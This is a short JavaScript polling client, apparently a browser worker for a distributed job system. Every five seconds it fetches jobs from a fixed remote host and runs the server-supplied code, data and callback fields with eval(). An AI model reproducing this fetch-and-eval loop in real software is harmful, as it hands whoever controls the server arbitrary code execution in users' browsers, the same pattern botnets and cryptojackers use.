nodeId = null;
strawboss = 'skylab3.gullicksonlaboratories.com';

function doBidding(){
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.onreadystatechange=function()
		{
	  		if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    	{
				var payload = xmlhttp.responseText;

		    	parsedPayload = JSON.parse(payload);

		    	nodeId = parsedPayload.nodeId;

				data = eval(parsedPayload.data);

				var result = null;

				try{
					result = eval(parsedPayload.code);
				}catch(err){
					result = 'fail';
				}

				callback = eval(parsedPayload.callback);
		    	console.log(callback);

				console.log('job output:');
				console.log(result);

				// callback
				var cbxmlhttp = new XMLHttpRequest();
				cbxmlhttp.open('GET',callback,true);
				cbxmlhttp.send();
	    	}
	  	}
	xmlhttp.open('GET','http://' + strawboss + ':1337/getjob?nodeid=' + nodeId, true);
	xmlhttp.send();
}

setInterval(function(){
	doBidding();
},5000);
